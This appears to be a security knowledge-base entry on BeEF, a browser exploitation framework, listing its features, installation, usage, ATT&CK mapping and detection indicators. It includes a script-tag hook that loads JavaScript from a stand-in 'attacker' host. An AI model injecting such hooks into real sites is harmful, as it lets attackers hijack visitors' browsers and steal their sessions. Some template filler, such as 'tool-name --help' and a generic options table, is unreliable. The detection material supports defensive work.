---
id: tool-uuid-001
url: 'https://beefproject.com/'
tags:
  - browser-exploitation
  - xss
  - hooking
type: tool
verified: false
platforms:
  - Linux
  - Windows
  - Web
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T03:15:30.772Z'
validated: true
submitted: true
---
# BeEF

**Status**: Unverified

## Overview

BeEF (Browser Exploitation Framework) is an open-source tool for exploiting XSS vulnerabilities by hooking browsers and performing advanced attacks like session hijacking, phishing, and keylogging.

## Description

BeEF allows attackers to control compromised browsers via injected JavaScript hooks. In offensive security, it's used post-XSS to expand access, such as stealing cookies or redirecting users. Features include a web UI for managing hooked zombies and modules for various exploits.

## Features

- Feature 1: Browser hooking via JS injection
- Feature 2: Modular attacks (e.g., social engineering, network reconnaissance)
- Feature 3: Real-time command execution on hooked browsers

## Installation

### Requirements

- Ruby environment
- Git
- Node.js for some modules

### Install Commands

```bash
# Clone repository
git clone https://github.com/beefproject/beef.git

# Navigate and install
cd beef
bundle install
```

## Basic Usage

```bash
tool-name --help
./beef
```

### Common Options

| Option | Description |
|--------|-------------|
| `-h, --help` | Show help message |
| `-v, --verbose` | Verbose output |

## Examples

### Example 1: Basic Usage

```bash
./beef -p 3000
```

Open http://localhost:3000/ui/panel to access dashboard.

### Example 2: Advanced Usage

```bash
./beef --use-https
```

Inject hook: <script src="http://attacker:3000/hook.js"></script>

## MITRE ATT&CK Mapping

This tool is commonly associated with:

### Techniques

- [[JavaScript]]
- [[Adversary-in-the-Middle]]

### Tactics

- [[Execution]]
- [[Collection]]

## Detection

Indicators and methods for detecting this tool's usage:

- Network traffic to unusual JS endpoints (e.g., /hook.js)
- Anomalous browser behavior like unexpected redirects
- CSP violations or console errors from hooked scripts

## Related Procedures


## Related Tools

- [[Metasploit]]
- [[Burp Suite]]

## References

- Official documentation: https://beefproject.com/
- Related resources: OWASP XSS Prevention Cheat Sheet
